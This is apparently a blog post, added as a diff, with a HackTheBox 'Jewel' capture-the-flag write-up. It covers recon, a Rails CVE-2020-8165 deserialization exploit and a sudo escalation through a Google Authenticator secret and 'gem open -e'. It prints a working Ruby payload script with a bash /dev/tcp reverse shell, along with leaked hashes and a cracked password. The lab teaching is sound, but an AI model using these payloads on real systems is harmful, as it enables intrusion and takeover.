@@ -1,0 +1,165 @@
+---
+title: HackTheBox Jewel Write Up
+desc: My writeup for jewel, a medium difficulty linux machine on HackTheBox platform
+layout: post
+date: February 13, 2021 11:59 PM
+image: /images/posts/jewel.jpg
+---
+<h1 class="cyan-text">HackTheBox Jewel Write Up</h1>
+
+<pre><code>---------------------------------
+--- Name       : Jewel ----------
+--- IP Address : 10.10.10.211 ---
+--- Platform   : Linux ----------
+--- Difficulty : Medium ---------
+---------------------------------</code></pre>
+
+<div class="content white-text"><p>Jewel is one of the most innovative machines I have solved on HTB platform, it shows a deserialization vulnerability in rails along with working around google authentication followed by privilege escalation using ruby gems.</p></div>
+
+<h2 class="cyan-text">Reconnaissance</h2>
+
+<div class="content white-text"><p>Fast 1K port scan using FinalRecon followed by service/version enumeration on open ports using nmap...</p></div>
+
+<pre><code>$ finalrecon --ps http://10.10.10.211
+
+ ______  __   __   __   ______   __
+/\  ___\/\ \ /\ "-.\ \ /\  __ \ /\ \
+\ \  __\\ \ \\ \ \-.  \\ \  __ \\ \ \____
+ \ \_\   \ \_\\ \_\\"\_\\ \_\ \_\\ \_____\
+  \/_/    \/_/ \/_/ \/_/ \/_/\/_/ \/_____/
+ ______   ______   ______   ______   __   __
+/\  == \ /\  ___\ /\  ___\ /\  __ \ /\ "-.\ \
+\ \  __< \ \  __\ \ \ \____\ \ \/\ \\ \ \-.  \
+ \ \_\ \_\\ \_____\\ \_____\\ \_____\\ \_\\"\_\
+  \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/ \/_/
+
+[>] Created By : thewhiteh4t
+[>] Version    : 1.0.7
+
+[+] Checking for Updates...[ Up-To-Date ]
+
+[+] Target : http://10.10.10.211
+
+[!] Starting Port Scan...
+
+[+] Testing Top 1000 Ports...
+
+[+] 22     ssh
+[+] 8080   http-alt
+[+] 8000   irdmi
+
+[+] Completed in 0:00:03.191492</code></pre>
+
+<pre><code>$ nmap -p 22,8080,8000 -sV 10.10.10.211 -Pn
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 21:18 IST
+Nmap scan report for 10.10.10.211
+Host is up (0.083s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+8000/tcp open  http    Apache httpd 2.4.38
+8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)</code></pre>
+
+<div class="content white-text"><p>On port 8080 there is a blog page, I did not find much in the source code so I moved to port 8000 where i found GitWeb, a simple web visualizer for the git service. <br> <a href="http://git-scm.com/book/en/v2/Git-on-the-Server-GitWeb" target="_blank">Read More</a> <br> Further inspecting the page and files I found multiple things...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/UHEDpTw.png"> </div>
+
+<div class="content white-text"><p>Email address of the author is visible along with a possible username "bill", Gemfile and Rakefile can also be seen which are associated with ruby. Inside Gemfile I found the versions of ruby, rails and bcrypt along with other modules...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/xoN1obW.png"> </div>
+
+<div class="content white-text"><p>On further inspection of visible files I found some hashes in "bd.sql" file...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/MFnna97.png"> </div>
+
+<pre><code>bill - $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+jennifer - $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</code></pre>
+
+<div class="content white-text"><p>Both hashes are bcrypt with 12 rounds, I tried to crack both hashes with john but that did not help so next I started looking for a vulnerability in GitWeb and rails.</p></div>
+
+<h2 class="cyan-text">CVE-2020-8165</h2>
+
+<div class="content white-text"><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8165" target="_blank">NVD Advisory</a> <br> A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE. You can read more about the vulnerability in this <a href="https://hackerone.com/reports/413388" target="_blank"> Hackerone Report</a>. The flaw can be spotted in "users_controller.rb" file on line number 37</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/i8Wn6wq.png"> </div>
+
+<h2 class="cyan-text">Intrusion</h2>
+
+<div class="content white-text"><p>The flaw is in the update functionality of the web application which is being used to update the username in user profile. I signed up in the blog on port 8080 and used the exploit I found here : <a href="https://github.com/masahiro331/CVE-2020-8165" target="_blank">CVE-2020-8165 Exploit by masahiro331</a> to write a ruby script which will generate the required payload for getting RCE on the target...</p></div>
+
+<pre><code>$ cat payload.rb
+
+require 'erb'
+require 'uri'
+require 'active_support'
+require 'active_support/core_ext'
+
+code = '`/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"`'
+
+erb = ERB.allocate
+erb.instance_variable_set :@src, code
+erb.instance_variable_set :@filename, "1"
+erb.instance_variable_set :@lineno, 1
+
+payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
+
+puts URI.encode_www_form(payload: payload)</code></pre>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/yoaU3Sj.png"> </div>
+
+<div class="content white-text"><p>I sent the payload in the username field of the request I intercepted using burp as you can see below...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/biKr0kB.png"> </div>
+
+<div class="content white-text"><p>In the vulnerable code above, you can see that on line 40 the page is supposed to be redirected to articles page i.e. the home page, payload triggered as soon as I visited the home page and I got foothold!</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/vTHj48G.png"> </div>
+
+<div class="content white-text"><p>The username is bill and I got the user flag in home directory.</p></div>
+
+<h2 class="cyan-text">Enumeration</h2>
+
+<div class="content white-text"><p>After some poking around I found a sql file in the following path...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/8kJ7QO3.png"> </div>
+
+<div class="content white-text"><p>You can see that although the file is owned by root but its permissions are misconfigured and it is readable, inside I found another bcrypt hash for our user "bill"</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/Hng73bV.png"> </div>
+
+<div class="content white-text"><p>This hash got cracked successfully using john and I got a password for bill here...</p></div>
+
+<pre><code>bill:spongebob</code></pre>
+
+<h2 class="cyan-text">Privilege Escalation</h2>
+
+<div class="content white-text"><p>First thing I tried was to execute sudo with "-l" flag which lists the privileges of the user but it asks for a verification code! Now I started looking for the origin of this verification system...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/SRxh3Zv.png"> </div>
+
+<div class="content white-text"><p>In the home directory I found a dot file, google-authenticator which contains a 26 character long alphanumeric string...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/c6SZ5xg.png"> </div>
+
+<div class="content white-text"><p>Fortunately I use google authenticator app and it offers two methods to add a new entry</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/jKeive5.png"> </div>
+
+<div class="content white-text"><p>I tried adding the alphanumeric string I found earlier into setup using key option and it worked, google authenticator is now generating codes!</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/j0T6neJ.png"> </div>
+
+<div class="content white-text"><p>and now I was finally able to use sudo and I found that our user bill can execute gem command!</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/8I00fkw.png"> </div>
+
+<div class="content white-text"><p>I used the following command to escalate privileges...</p></div>
+
+<pre><code># https://gtfobins.github.io/gtfobins/gem/
+
+$ sudo gem open -e "/bin/sh -c /bin/bash" rdoc</code></pre>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/28jgQ3J.png"> </div>
+
+<div class="content white-text"><p>Solved!</p></div>
